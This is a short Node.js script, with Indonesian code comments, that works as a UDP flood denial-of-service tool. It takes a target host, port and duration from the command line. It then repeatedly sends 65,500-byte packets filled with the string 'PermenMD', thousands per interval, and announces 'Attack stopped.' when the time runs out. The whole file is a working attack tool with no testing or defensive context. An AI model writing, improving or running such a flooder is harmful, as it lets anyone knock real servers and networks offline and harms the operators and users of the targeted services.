const dgram = require('dgram');

const target = process.argv[2];
const port = process.argv[3];
const duration = process.argv[4];
function generatePayload(size) {
    let payload = Buffer.alloc(size);
    payload.fill('PermenMD');
    return payload;
}

const payload = generatePayload(65500);
const socket = dgram.createSocket('udp4'); // Socket dibuat sekali di sini

setInterval(() => {
    for (let p = 0; p < 100; p++) {
        socket.send(payload, 0, payload.length, port, target);
        socket.send(payload, 0, payload.length, port, target);
        socket.send(payload, 0, payload.length, port, target);
        socket.send(payload, 0, payload.length, port, target);
        socket.send(payload, 0, payload.length, port, target);
        socket.send(payload, 0, payload.length, port, target);
        socket.send(payload, 0, payload.length, port, target);
        socket.send(payload, 0, payload.length, port, target);
        socket.send(payload, 0, payload.length, port, target);
        socket.send(payload, 0, payload.length, port, target);
        socket.send(payload, 0, payload.length, port, target);
        socket.send(payload, 0, payload.length, port, target);
        socket.send(payload, 0, payload.length, port, target);
        socket.send(payload, 0, payload.length, port, target);
        socket.send(payload, 0, payload.length, port, target);
        socket.send(payload, 0, payload.length, port, target);
        socket.send(payload, 0, payload.length, port, target);
        socket.send(payload, 0, payload.length, port, target);
        socket.send(payload, 0, payload.length, port, target);
        socket.send(payload, 0, payload.length, port, target);
        socket.send(payload, 0, payload.length, port, target);
        socket.send(payload, 0, payload.length, port, target);
    }
});

console.clear();
console.log(``);
setTimeout(() => {
    console.log('Attack stopped.');
    socket.close(); // Tutup socket di akhir
    process.exit(0);
}, duration * 1000);
